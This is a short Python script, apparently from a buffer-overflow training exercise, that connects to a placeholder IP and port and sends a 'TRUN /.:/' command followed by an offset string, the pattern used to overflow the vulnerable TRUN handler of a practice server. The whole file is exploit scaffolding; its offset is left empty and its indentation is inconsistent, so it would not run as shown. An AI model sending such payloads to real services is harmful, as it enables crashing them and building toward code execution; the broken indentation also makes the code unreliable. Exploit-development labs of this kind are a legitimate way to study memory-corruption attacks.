#!/usr/bin/python3

import sys, socket
from time import sleep

offset = "" #offset 

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('IP', 'PORT'))
  
  payload = "TRUN /.:/" + offset
  
  s.send((payload.encode()))
  s.close()
except:
  print("Error connecting to the application/server")
  sys.exit()
